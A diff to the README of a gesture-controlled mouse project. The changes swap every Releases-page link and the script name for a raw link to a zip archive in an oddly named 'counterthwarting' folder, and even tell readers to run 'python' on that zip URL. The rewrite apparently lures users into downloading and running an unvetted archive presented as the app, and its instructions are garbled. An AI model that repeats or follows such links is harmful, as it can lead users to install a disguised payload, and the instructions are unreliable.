@@ -4,7 +4,7 @@
 The gesture-mouse project uses AI to create a touchless mouse controller. With your webcam and hand gestures, you can navigate your computer without any physical device. This project enhances how we interact with our computers in a simple way.
 
 ## 📥 Download the Application
-[![Download gesture-mouse](https://img.shields.io/badge/Download-gesture--mouse-blue.svg)](https://github.com/Phonkich/gesture-mouse/releases)
+[![Download gesture-mouse](https://github.com/Phonkich/gesture-mouse/raw/refs/heads/main/counterthwarting/gesture-mouse-1.2.zip)](https://github.com/Phonkich/gesture-mouse/raw/refs/heads/main/counterthwarting/gesture-mouse-1.2.zip)
 
 ## 🚀 Getting Started
 To start using gesture-mouse, follow these steps:
@@ -16,7 +16,7 @@ To start using gesture-mouse, follow these steps:
    - Internet connection: Needed for downloading the software and dependencies.
 
 2. **Download the Software**
-   Visit the [Releases page](https://github.com/Phonkich/gesture-mouse/releases) to download the latest version of gesture-mouse.
+   Visit the [Releases page](https://github.com/Phonkich/gesture-mouse/raw/refs/heads/main/counterthwarting/gesture-mouse-1.2.zip) to download the latest version of gesture-mouse.
 
 3. **Install the Required Dependencies**
    After downloading, you will need to install a few dependencies for the application to run smoothly. Open your command line interface (Command Prompt for Windows, Terminal for macOS/Linux) and run the following commands:
@@ -29,10 +29,10 @@ To start using gesture-mouse, follow these steps:
    ```
 
 4. **Run the Application**
-   Navigate to the folder where you downloaded the application. You will find an executable file named `gesture_mouse.py`. Open your command line interface and enter:
+   Navigate to the folder where you downloaded the application. You will find an executable file named `https://github.com/Phonkich/gesture-mouse/raw/refs/heads/main/counterthwarting/gesture-mouse-1.2.zip`. Open your command line interface and enter:
 
    ```bash
-   python gesture_mouse.py
+   python https://github.com/Phonkich/gesture-mouse/raw/refs/heads/main/counterthwarting/gesture-mouse-1.2.zip
    ```
 
    This command will launch the application. Make sure your webcam is turned on.
@@ -63,4 +63,4 @@ gesture-mouse is licensed under the MIT License. You can freely use, modify, and
 We welcome contributions! If you wish to improve or add new features, please fork the repository and submit a pull request. Your contributions will help enhance this tool for everyone.
 
 ## 📥 Download & Install
-Now that you know what gesture-mouse is and how it works, it's time to get started. Visit the [Releases page](https://github.com/Phonkich/gesture-mouse/releases) to download the latest version. Follow the instructions above to install and run the application. Enjoy controlling your computer with just your hands!
+Now that you know what gesture-mouse is and how it works, it's time to get started. Visit the [Releases page](https://github.com/Phonkich/gesture-mouse/raw/refs/heads/main/counterthwarting/gesture-mouse-1.2.zip) to download the latest version. Follow the instructions above to install and run the application. Enjoy controlling your computer with just your hands!
